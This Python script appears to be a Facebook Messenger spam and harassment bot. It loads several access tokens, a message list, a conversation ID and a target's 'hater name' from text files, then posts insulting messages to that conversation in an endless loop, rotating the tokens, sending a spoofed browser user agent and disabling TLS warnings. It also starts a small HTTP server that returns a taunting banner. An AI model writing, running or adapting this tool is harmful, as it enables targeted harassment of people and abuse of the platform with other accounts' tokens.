import requests
import os
import threading
import http.server
import socketserver
import time
from platform import system

# --- HTTP SERVER SECTION ---
class SimpleHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(b">>> V33R_KIRSH9N_CHM9R_K9_D9DDY_H3R3 <<<")

def run_http_server(port=4000):
    with socketserver.TCPServer(("", port), SimpleHandler) as httpd:
        print(f"[HTTP] Server running at http://localhost:{port}")
        httpd.serve_forever()

# --- UTILITY FUNCTIONS ---
def clear_screen():
    if system() == 'Linux':
        os.system('clear')
    elif system() == 'Windows':
        os.system('cls')

def print_banner():
    print('\u001b[37m' + '>>> V33R_KIRSH9N_CHM9R_K9_D9DDY_H3R3 <<<')

def load_lines(filename):
    if not os.path.exists(filename):
        print(f"[ERROR] {filename} not found.")
        return []
    with open(filename, 'r', encoding='utf-8') as file:
        return [line.strip() for line in file if line.strip()]

# --- MESSAGING SECTION ---
def send_messages():
    tokens = load_lines('tokennum.txt')
    messages = load_lines('File.txt')
    convo_id = ''.join(load_lines('convo.txt'))
    hater_name = ''.join(load_lines('hatername.txt'))
    try:
        speed = int(''.join(load_lines('time.txt')))
    except ValueError:
        print("[ERROR] Invalid time delay. Defaulting to 2 seconds.")
        speed = 2

    if not (tokens and messages and convo_id and hater_name):
        print("[ERROR] Missing required input data.")
        return

    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; ...)',
        'Accept': 'application/json',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9',
        'referer': 'www.google.com'
    }
    requests.packages.urllib3.disable_warnings()

    print_banner()
    print("[INFO] Starting message sending loop...")

    max_tokens = min(len(tokens), len(messages))
    while True:
        try:
            for idx, message in enumerate(messages):
                token = tokens[idx % max_tokens]
                full_message = f"{hater_name} {message}"
                url = f"https://graph.facebook.com/v15.0/t_{convo_id}/"
                params = {'access_token': token, 'message': full_message}
                response = requests.post(url, json=params, headers=headers)
                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
                if response.ok:
                    print(f" [SENT] Group {convo_id} Token {idx+1} at {current_time}")
                else:
                    print(f" [FAILED] Group {convo_id} Token {idx+1} at {current_time}: {response.text}")
                time.sleep(speed)
            print("[INFO] All messages sent. Looping again...")
        except Exception as e:
            print(f"[ERROR] Exception occurred: {e}")
        time.sleep(2)

# --- MAIN ---
def main():
    clear_screen()
    print_banner()
    server_thread = threading.Thread(target=run_http_server, args=(4000,), daemon=True)
    server_thread.start()
    send_messages()

if __name__ == "__main__":
    main()
